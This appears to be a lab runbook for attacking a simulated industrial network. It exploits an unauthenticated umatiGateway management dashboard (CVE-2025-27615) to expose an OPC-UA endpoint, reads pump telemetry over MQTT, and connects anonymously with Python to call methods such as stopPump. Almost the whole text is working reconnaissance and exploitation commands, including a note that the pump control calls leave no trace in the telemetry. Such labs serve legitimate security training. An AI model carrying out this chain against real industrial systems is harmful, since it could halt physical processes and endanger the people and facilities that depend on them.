# Runbook: guild-exchange

## Discovery

The DMZ address 10.10.5.10 may surface in prior loot or appear in a port scan. Port 8080 is reachable from the internet zone.

```bash
ponder@unseen-gate:~$ nmap -sV 10.10.5.10
```

Port 8080 shows as an HTTP service under a .NET/Kestrel server. Port 4840 does not appear; the OPC-UA endpoint is not directly reachable from this vantage point. Port 8080 is the only surface from here.

## Management console

```bash
ponder@unseen-gate:~$ curl -s -o /dev/null -w '%{http_code}' http://10.10.5.10:8080/
```

Returns `200`. No redirect, no authentication challenge. A management interface responding with 200 to an unauthenticated request is already a finding.

```bash
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/
```

The response is the umatiGateway management dashboard: a .NET application that bridges OPC-UA data to MQTT. The page shows current connection status, which OPC-UA nodes are subscribed, and where the output goes. None of this requires a login. This is CVE-2025-27615.

## OPC endpoint

```bash
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/OPCConnection
```

The full OPC-UA client configuration appears in the response: endpoint URL `opc.tcp://10.10.5.13:4840`, security mode None, anonymous authentication. The gateway connects to guild-register at startup and sees no reason to restrict read access to its own configuration. An address inside the DMZ, not reachable from the internet zone, has just appeared in plain text.

## MQTT output

The dashboard also reveals the MQTT destination: clacks-relay at `10.10.5.12:1883`. guild-exchange publishes telemetry from guild-register every five to ten seconds under two topic prefixes:

```
umati/v2/<namespace>/<node-name>    every 5 seconds
umati/v3/<namespace>/<node-name>    every 10 seconds
```

Three nodes from the Pump01 object on guild-register are published: operating level (node 7, %), flow rate (node 9, m³/h), and power draw (node 11, kW). From a machine with access to port 1883 and a mosquitto client:

```bash
mosquitto_sub -h 10.10.5.12 -t 'umati/#' -v
```

Messages arrive within a few seconds of connecting.

## Direct OPC-UA access

The `/OPCConnection` response named guild-register as `opc.tcp://10.10.5.13:4840` with SecurityMode None and anonymous authentication. That is an invitation. From a machine with network access to port 4840 and a Python OPC-UA client:

```python
from opcua import Client

c = Client("opc.tcp://10.10.5.13:4840")
c.connect()
root = c.get_root_node()
# browse root.get_children() to locate the Pump01 object and its Methods folder
```

The Pump01 Methods folder contains four callable methods: `stopPump`, `startPump`, `resetFilter`, `changeOil`. No credential is required.

## Observe before acting

Watch the MQTT stream for a minute before calling anything. Normal operating level, flow, and power values establish a baseline. Call `stopPump`, wait one publish interval, then compare. The values change within five seconds on the `umati/v2` prefix. Nothing in the MQTT messages indicates a method call caused the change.

## What you can know now

Access:
- Management dashboard at `http://10.10.5.10:8080/` from the internet zone, no credentials required
- OPC-UA endpoint exposed by the dashboard: `opc.tcp://10.10.5.13:4840`, SecurityMode None, anonymous

Data:
- guild-register publishes Pump01 telemetry: operating level (node 7, %), flow (node 9, m³/h), power (node 11, kW)
- MQTT broker receiving the output: `10.10.5.12:1883`, anonymous connections accepted

Methods callable on Pump01:
- `stopPump`, `startPump`, `resetFilter`, `changeOil`

## Quick reference

```
ponder@unseen-gate:~$ nmap -sV 10.10.5.10                           open ports from internet zone
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/              management dashboard, no auth
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/OPCConnection OPC endpoint, security mode, auth
opc.tcp://10.10.5.13:4840                                           guild-register, SecurityMode None
mosquitto_sub -h 10.10.5.12 -t 'umati/#' -v                       observe pump telemetry (DMZ access needed)
stopPump / startPump / resetFilter / changeOil                      callable methods on Pump01
```
